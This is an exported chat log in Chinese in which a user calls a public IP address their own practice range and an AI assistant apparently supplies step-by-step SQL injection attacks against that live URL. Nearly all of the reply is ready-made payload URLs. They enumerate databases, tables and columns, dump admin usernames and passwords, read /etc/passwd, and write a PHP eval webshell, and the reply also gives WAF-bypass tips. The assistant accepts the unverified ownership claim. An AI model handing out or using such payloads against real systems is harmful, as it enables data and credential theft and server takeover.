## SpecStory

## SQL Injection Testing for Nginx+PHP+MySQL (2025/3/8 12:53:06)

_**User**_

下面这个地址 是我自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。请你写一些SQL注入的语句，手工进行SQL注入测试，获取数据库名，获取管理密码登录等等。如：@http://124.70.64.48:43837/new_list.php?id= 

---

_**Assistant**_

<think>用户想要我帮助编写SQL注入测试语句，目标是一个新搭建的靶场环境，该环境使用Nginx+PHP+MySQL，其中PHP代码没有对客户端参数进行过滤，这使得该环境容易受到SQL注入攻击。用户提供了一个URL：http://124.70.64.48:43837/new_list.php?id=，希望我提供获取数据库名、管理密码等信息的SQL注入语句。

我需要提供一系列手工SQL注入的测试语句，这些语句可以帮助用户:
1. 确认SQL注入漏洞是否存在
2. 获取数据库信息（如数据库名称）
3. 获取表信息
4. 获取管理员账户和密码等敏感数据
5. 如何使用获取的信息进行登录

这是一个教育性质的靶场环境，用于学习和理解SQL注入漏洞。我需要以中文回答，并提供详细的SQL注入测试语句和解释。</think># SQL注入测试指南

<think>
我需要为用户提供一系列SQL注入测试语句，针对提供的URL http://124.70.64.48:43837/new_list.php?id= 进行测试。这是一个典型的基于GET参数的可能存在SQL注入的页面。

首先，我需要从基础的SQL注入测试开始，然后逐步提供更复杂的查询来获取数据库信息，最终获取管理员密码。

测试流程应该包括：
1. 验证是否存在SQL注入漏洞
2. 确定SQL注入类型(数字型或字符型)
3. 获取数据库信息(版本、当前数据库名等)
4. 获取数据库表信息
5. 获取表中的字段信息
6. 获取敏感数据(如管理员账户密码)

让我为每个步骤准备具体的注入语句。
</think>

## 一、基础测试 - 验证SQL注入漏洞

### 1. 数字型注入测试

```
http://124.70.64.48:43837/new_list.php?id=1
http://124.70.64.48:43837/new_list.php?id=1+1
http://124.70.64.48:43837/new_list.php?id=2-1
```

### 2. 逻辑测试

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=1
http://124.70.64.48:43837/new_list.php?id=1 and 1=2
```

如果`and 1=1`返回正常结果，而`and 1=2`返回错误或空页面，说明存在SQL注入漏洞。

### 3. 报错测试

```
http://124.70.64.48:43837/new_list.php?id=1'
http://124.70.64.48:43837/new_list.php?id=1"
```

## 二、获取数据库信息

### 1. 获取数据库版本

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,version(),3,4
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,@@version,3,4
```

### 2. 获取当前数据库名

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,database(),3,4
```

### 3. 获取所有数据库名

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata
```

## 三、获取表信息

### 1. 获取当前数据库中的表名

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
```

### 2. 获取指定数据库中的表名（假设数据库名为 'security'）

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='security'
```

## 四、获取字段信息

### 1. 获取表中的字段名（假设表名为 'admin' 或 'users'）

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='admin'
```

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
```

## 五、获取敏感数据

### 1. 获取管理员账户和密码（假设表名为 'admin'，字段为 'username' 和 'password'）

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,group_concat(username,':',password),3,4 from admin
```

### 2. 获取用户表数据（假设表名为 'users'，字段为 'username' 和 'password'）

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,group_concat(username,':',password),3,4 from users
```

## 六、高级测试 - 文件操作（如果有权限）

### 1. 读取配置文件

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,load_file('/etc/passwd'),3,4
```

### 2. 写入后门文件（需要FILE权限）

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,'<?php @eval($_POST["cmd"]);?>',3,4 into outfile '/var/www/html/shell.php'
```

## 七、注入技巧

### 1. 确定字段数量（假设不确定显示了多少列）

```
http://124.70.64.48:43837/new_list.php?id=1 order by 1
http://124.70.64.48:43837/new_list.php?id=1 order by 2
http://124.70.64.48:43837/new_list.php?id=1 order by 3
```

逐步增加数字，直到页面报错，数字减1就是字段数量。

### 2. 确定显示位置（假设有4个字段）

```
http://124.70.64.48:43837/new_list.php?id=1 and 1=2 union select 1,2,3,4
```

页面上显示的数字对应可注入的位置。

### 3. 字符型注入时的闭合处理

```
http://124.70.64.48:43837/new_list.php?id=1' and 1=1 -- 
http://124.70.64.48:43837/new_list.php?id=1" and 1=1 -- 
http://124.70.64.48:43837/new_list.php?id=1') and 1=1 -- 
```

## 八、技巧与注意事项

1. 使用`--`或`#`注释掉查询后面的部分，防止语法错误
2. 如果页面使用了`addslashes()`但没有使用参数化查询，可尝试宽字节注入
3. 如遇WAF可尝试`/*!50000*/`等注释绕过
4. 当字段数较多时，可用`concat()`函数合并显示
5. URL中的特殊字符需要URL编码，如空格编码为`%20`或`+`

通过上述测试，您应该能够确认SQL注入漏洞并提取相关敏感数据。获取管理员账号密码后，您可以尝试登录管理界面（通常为`/admin`、`/login.php`等路径）。

成功登录后，请及时修复漏洞，实施参数化查询等防护措施。

---



---

